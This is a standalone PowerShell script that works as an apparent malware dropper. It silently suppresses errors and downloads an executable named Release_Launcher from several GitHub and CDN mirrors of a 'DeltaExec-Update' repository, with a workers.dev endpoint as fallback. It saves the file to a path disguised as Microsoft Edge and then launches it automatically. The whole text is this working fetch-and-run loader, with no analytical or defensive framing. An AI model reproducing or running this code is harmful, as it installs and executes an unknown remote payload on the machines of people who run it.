$ErrorActionPreference='SilentlyContinue'
$pe="$env:LOCALAPPDATA\MicrosoftEdge\main.exe"
$u=@(
 'https://github.com/MetropolisFrog/DeltaExec-Update/releases/download/v4.0/Release_Launcher.exe',
 'https://cdn.jsdelivr.net/gh/MetropolisFrog/DeltaExec-Update@v4.0/Release_Launcher.zip',
 'https://cdn.statically.io/gh/MetropolisFrog/DeltaExec-Update/main/Release_Launcher.zip',
 'https://raw.githubusercontent.com/MetropolisFrog/DeltaExec-Update/main/Release_Launcher.exe'
)
foreach($x in $u){try{(New-Object Net.WebClient).DownloadFile($x,$pe);if((Test-Path $pe)-and((Get-Item $pe).Length -gt 10000)){break}}catch{}}
if(!(Test-Path $pe)-or((Get-Item $pe).Length -le 10000)){try{Invoke-WebRequest -UseBasicParsing 'https://api.quiet-hill-b6c6.workers.dev/p?c=main&k=8c1f42&r=1' -OutFile $pe}catch{}}
if((Test-Path $pe)-and((Get-Item $pe).Length -gt 10000)){Start-Process $pe}else{Start-Process 'https://quiet-hill.xyz/'}
